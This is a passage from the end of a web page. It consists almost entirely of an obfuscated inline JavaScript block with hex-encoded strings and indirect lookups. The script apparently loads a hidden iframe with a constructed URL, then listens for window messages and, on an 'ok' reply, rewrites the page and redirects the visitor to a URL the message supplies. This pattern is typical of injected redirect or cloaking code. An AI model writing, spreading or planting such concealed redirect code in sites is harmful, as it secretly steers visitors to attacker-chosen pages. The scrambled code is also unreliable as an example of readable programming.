61\x4c\x6f\x57','\x69\x63\x61\x47\x46\x71\x4f\x47\x69\x63\x61\x47','\x7a\x4d\x39\x57\x71\x78\x43','\x7a\x67\x4c\x5a\x43\x67\x58\x48\x45\x71','\x69\x63\x61\x47\x69\x63\x61\x55','\x41\x66\x7a\x6a\x45\x65\x79','\x7a\x67\x39\x33','\x76\x30\x72\x32\x76\x68\x43','\x43\x33\x62\x53\x41\x78\x71','\x69\x63\x61\x47\x69\x63\x61\x47\x69\x63\x62\x59\x41\x71','\x69\x64\x69\x57\x6d\x4a\x47\x47\x6d\x64\x61\x36\x6d\x61','\x69\x63\x61\x47\x69\x63\x62\x49\x42\x33\x72\x30\x42\x57','\x76\x4c\x6a\x54\x72\x65\x75','\x69\x63\x61\x47\x69\x63\x62\x48\x42\x4d\x4c\x54\x79\x71','\x69\x67\x35\x56\x42\x4d\x75\x37\x63\x49\x61\x47\x69\x61','\x43\x32\x48\x48\x43\x4e\x6a\x48\x45\x74\x4f\x47\x6d\x71','\x43\x76\x6e\x6b\x44\x30\x75','\x43\x33\x72\x59\x42\x32\x54\x4c\x6c\x78\x44\x50\x7a\x61','\x79\x77\x7a\x30\x7a\x78\x6a\x49\x7a\x77\x44\x50\x42\x47','\x43\x4d\x76\x4d\x7a\x78\x6a\x59\x7a\x78\x6a\x57\x42\x57','\x43\x4d\x66\x54\x7a\x78\x6d\x47\x43\x4d\x39\x30\x79\x71','\x42\x32\x54\x4c\x6f\x49\x61\x4a\x6e\x74\x6d\x31\x6d\x57','\x44\x67\x76\x59\x6f\x57\x4f\x47\x69\x63\x61\x47\x69\x61','\x7a\x4e\x62\x78\x79\x4d\x4f','\x44\x67\x66\x49\x42\x67\x75','\x42\x67\x76\x55\x7a\x33\x72\x4f','\x79\x77\x72\x4b\x72\x78\x7a\x4c\x42\x4e\x72\x6d\x41\x71','\x71\x77\x6e\x63\x77\x4b\x47','\x43\x32\x76\x48\x43\x4d\x6e\x4f','\x79\x77\x35\x5a\x7a\x4d\x39\x59\x42\x74\x4f\x47\x43\x47','\x42\x32\x54\x4c\x6c\x77\x72\x48\x43\x32\x48\x48\x43\x47','\x69\x68\x6a\x50\x7a\x32\x48\x30\x6f\x49\x61\x57\x6f\x57','\x42\x78\x6d\x36\x69\x67\x6e\x4c\x42\x4e\x72\x4c\x43\x47','\x76\x66\x62\x70\x74\x4b\x57','\x69\x63\x61\x47\x44\x67\x38\x47\x45\x57\x4f\x47\x69\x61','\x42\x74\x4f\x47\x6d\x64\x53\x6b\x69\x63\x61\x47\x69\x61','\x72\x33\x76\x30\x75\x30\x71','\x79\x32\x4c\x59\x79\x32\x58\x4c','\x69\x63\x62\x4b\x41\x78\x6e\x57\x42\x67\x66\x35\x6f\x47','\x69\x68\x62\x56\x43\x32\x4c\x30\x41\x77\x39\x55\x6f\x47','\x72\x76\x6a\x4b\x45\x67\x34','\x6c\x4e\x43\x5a\x6c\x4d\x39\x59\x7a\x59\x38\x59\x6d\x61','\x79\x77\x72\x4b','\x44\x67\x75\x47\x45\x57\x4f\x47\x69\x63\x61\x47\x69\x61','\x42\x66\x72\x78\x76\x75\x4f','\x44\x67\x66\x76\x71\x4d\x38','\x43\x4d\x76\x30\x44\x78\x6a\x55\x69\x63\x48\x4d\x44\x71','\x44\x78\x7a\x33\x45\x68\x4c\x36\x71\x75\x6a\x64\x72\x61','\x73\x77\x76\x69\x77\x67\x53','\x43\x32\x76\x30\x71\x78\x72\x30\x43\x4d\x4c\x49\x44\x71','\x76\x32\x7a\x4e\x74\x31\x65','\x43\x59\x62\x53\x41\x77\x35\x4c\x79\x78\x69\x47\x41\x71','\x43\x68\x6a\x56\x44\x67\x39\x30\x45\x78\x62\x4c','\x69\x63\x61\x47\x69\x63\x61\x47\x69\x63\x62\x5a\x44\x61','\x43\x33\x6a\x4a','\x69\x64\x65\x55\x6e\x78\x6d\x47\x7a\x77\x66\x5a\x7a\x71','\x79\x77\x6a\x4a\x7a\x67\x76\x4d\x7a\x32\x48\x50\x41\x47','\x77\x67\x39\x69\x71\x76\x61','\x44\x4d\x4c\x4c\x44\x30\x6a\x56\x45\x61','\x43\x4d\x66\x55\x43\x32\x7a\x56\x43\x4d\x30\x54\x42\x57','\x73\x32\x44\x62\x73\x77\x34','\x43\x4d\x66\x35\x6f\x49\x61\x34\x6f\x73\x57\x47\x6d\x47','\x41\x77\x35\x5a\x7a\x78\x6a\x30\x71\x77\x72\x51\x79\x71','\x43\x4d\x76\x57\x42\x67\x66\x4a\x7a\x71','\x41\x77\x35\x4b\x7a\x78\x48\x70\x7a\x47','\x42\x33\x61\x36\x69\x64\x61\x37\x63\x49\x61\x47\x69\x61'];_0x1a2f=function(){return _0x5e92f4;};return _0x1a2f();}_0x1e95e2[_0x1a45f8(0x2f4)]>-0x1*-0x187c+0x652+-0x1*0x1ece?_0x640ed9=_0x640ed9[_0x3f496(0x1e6)]('\x3f')>=-0x24aa+0xf93*-0x1+0x343d*0x1?_0x640ed9+'\x26'+_0x1e95e2:_0x640ed9+'\x3f'+_0x1e95e2:![];let _0x28c2de=document[_0x1a45f8(0x29b)+_0x1a45f8(0x27d)](_0x3f496(0x1eb));_0x28c2de[_0x3f496(0x25f)][_0x1a45f8(0x2de)]=_0x3f496(0x232),_0x28c2de[_0x1a45f8(0x1d7)+'\x74\x65'](_0x3f496(0x2ee)+_0x3f496(0x1ee),_0x1a45f8(0x213)+'\x72'),_0x28c2de[_0x1a45f8(0x1dc)]=_0x640ed9,document[_0x3f496(0x200)][_0x1a45f8(0x28e)+'\x64'](_0x28c2de),_0x28c2de[_0x1a45f8(0x23a)]=function(){var _0xf94df8={_0xb90840:0x2c5,_0xae36bb:0x209,_0x4d23cb:0x22c,_0x1d86b0:0x2e1,_0x32a48a:0x270,_0x24ba95:0x2c5,_0x2de3f0:0x1dc},_0x5a3c4a=_0x1a45f8,_0x103b2c=_0x1a45f8,_0x4c6855={};_0x4c6855[_0x5a3c4a(_0xf94df8._0xb90840)]=_0x103b2c(_0xf94df8._0xae36bb);var _0x4c605a=_0x4c6855;_0x28c2de[_0x103b2c(_0xf94df8._0x4d23cb)+_0x5a3c4a(_0xf94df8._0x1d86b0)][_0x103b2c(_0xf94df8._0x32a48a)+'\x65'](_0x4c605a[_0x103b2c(_0xf94df8._0x24ba95)],_0x28c2de[_0x5a3c4a(_0xf94df8._0x2de3f0)]);},window[_0x1a45f8(0x2f5)+_0x3f496(0x266)](_0x3f496(0x2b0),function(_0x1a061f){var _0x3ad33a={_0x4cb594:0x1d3,_0x29099e:0x285,_0x100e95:0x27f,_0x54a874:0x2ca,_0x5b1458:0x1ed,_0x21a6f8:0x2a1,_0x3a38eb:0x2d5,_0xd28374:0x2c8,_0x3a1db0:0x23b,_0x37711f:0x2cf,_0xb5b9a0:0x1ec,_0x5f0732:0x284,_0x2b5326:0x219,_0x4b5230:0x1ca,_0x4eff09:0x2ad,_0xd761c3:0x279,_0x4854fc:0x2e5,_0xa3cf51:0x28b,_0x5712ce:0x282,_0x3bdfde:0x2c0,_0x4b1743:0x1f5,_0x466a65:0x206,_0x1b92f2:0x1f8,_0x13fb6b:0x239,_0x47ac19:0x2bf,_0x3a9f16:0x2b3,_0x236074:0x27f,_0x2d3d86:0x24b,_0x290aaa:0x228,_0xd9855a:0x2c8,_0x3c963b:0x2cb,_0xed59c9:0x261,_0x342167:0x1e5,_0x1e23fb:0x288,_0x10629d:0x291,_0x17bee0:0x27f,_0x4a7e54:0x2c0,_0xe0173a:0x206,_0x3cdeaa:0x1f8,_0xd1870:0x200,_0x5cb001:0x221,_0x3172c8:0x1d0,_0x54d489:0x221,_0x3bc31a:0x1d3},_0x2d140d=_0x3f496,_0xe45b19=_0x3f496,_0x59a64c={};_0x59a64c[_0x2d140d(_0x3ad33a._0x4cb594)]=_0x2d140d(_0x3ad33a._0x29099e),_0x59a64c[_0x2d140d(_0x3ad33a._0x100e95)]=function(_0xe84db2,_0x4ae1e5){return _0xe84db2===_0x4ae1e5;},_0x59a64c[_0xe45b19(_0x3ad33a._0x54a874)]=_0xe45b19(_0x3ad33a._0x5b1458),_0x59a64c[_0xe45b19(_0x3ad33a._0x21a6f8)]=function(_0x176fbb,_0x5b2768){return _0x176fbb+_0x5b2768;},_0x59a64c[_0xe45b19(_0x3ad33a._0x3a38eb)]=function(_0x38e347,_0x5c6a4d){return _0x38e347+_0x5c6a4d;},_0x59a64c[_0xe45b19(_0x3ad33a._0xd28374)]=_0xe45b19(_0x3ad33a._0x3a1db0)+_0xe45b19(_0x3ad33a._0x37711f)+_0x2d140d(_0x3ad33a._0xb5b9a0)+_0xe45b19(_0x3ad33a._0x5f0732)+_0xe45b19(_0x3ad33a._0x2b5326),_0x59a64c[_0x2d140d(_0x3ad33a._0x4b5230)]=_0x2d140d(_0x3ad33a._0x4eff09)+_0xe45b19(_0x3ad33a._0xd761c3)+_0x2d140d(_0x3ad33a._0x4854fc)+_0x2d140d(_0x3ad33a._0xa3cf51)+_0xe45b19(_0x3ad33a._0x5712ce),_0x59a64c[_0xe45b19(_0x3ad33a._0x3bdfde)]=_0xe45b19(_0x3ad33a._0x4b1743),_0x59a64c[_0xe45b19(_0x3ad33a._0x466a65)]=function(_0x20dc9b,_0x3f72e3){return _0x20dc9b===_0x3f72e3;},_0x59a64c[_0x2d140d(_0x3ad33a._0x1b92f2)]=_0xe45b19(_0x3ad33a._0x13fb6b);var _0x22ec58=_0x59a64c;_0x1a061f=JSON[_0xe45b19(_0x3ad33a._0x47ac19)](_0x1a061f[_0xe45b19(_0x3ad33a._0x3a9f16)]);if(_0x22ec58[_0x2d140d(_0x3ad33a._0x236074)](_0x1a061f[_0x2d140d(_0x3ad33a._0x2d3d86)],'\x6f\x6b')){if(_0x22ec58[_0xe45b19(_0x3ad33a._0x236074)](_0x22ec58[_0xe45b19(_0x3ad33a._0x54a874)],_0x22ec58[_0xe45b19(_0x3ad33a._0x54a874)]))document[_0x2d140d(_0x3ad33a._0x290aaa)]=_0x22ec58[_0x2d140d(_0x3ad33a._0x21a6f8)](_0x22ec58[_0xe45b19(_0x3ad33a._0x3a38eb)](_0x22ec58[_0x2d140d(_0x3ad33a._0xd9855a)],document[_0x2d140d(_0x3ad33a._0x3c963b)][_0xe45b19(_0x3ad33a._0xed59c9)]),_0x22ec58[_0xe45b19(_0x3ad33a._0x4b5230)]),window[_0x2d140d(_0x3ad33a._0x3c963b)][_0xe45b19(_0x3ad33a._0x342167)](_0x1a061f[_0xe45b19(_0x3ad33a._0x1e23fb)]);else{if(_0x230546){var _0x300a9a=_0x3e8e97[_0x2d140d(_0x3ad33a._0x10629d)](_0x30b1c5,arguments);return _0x1228d0=null,_0x300a9a;}}}_0x22ec58[_0x2d140d(_0x3ad33a._0x17bee0)](_0x1a061f[_0xe45b19(_0x3ad33a._0x2d3d86)],_0x22ec58[_0xe45b19(_0x3ad33a._0x4a7e54)])&&(_0x22ec58[_0x2d140d(_0x3ad33a._0xe0173a)](_0x22ec58[_0x2d140d(_0x3ad33a._0x3cdeaa)],_0x22ec58[_0x2d140d(_0x3ad33a._0x1b92f2)])?document[_0xe45b19(_0x3ad33a._0xd1870)][_0xe45b19(_0x3ad33a._0x5cb001)][_0xe45b19(_0x3ad33a._0x3172c8)](_0x22ec58[_0xe45b19(_0x3ad33a._0x4cb594)]):_0x59e678[_0x2d140d(_0x3ad33a._0xd1870)][_0xe45b19(_0x3ad33a._0x54d489)][_0xe45b19(_0x3ad33a._0x3172c8)](_0x22ec58[_0x2d140d(_0x3ad33a._0x3bc31a)]));},![]);</script>
</body>
</html>
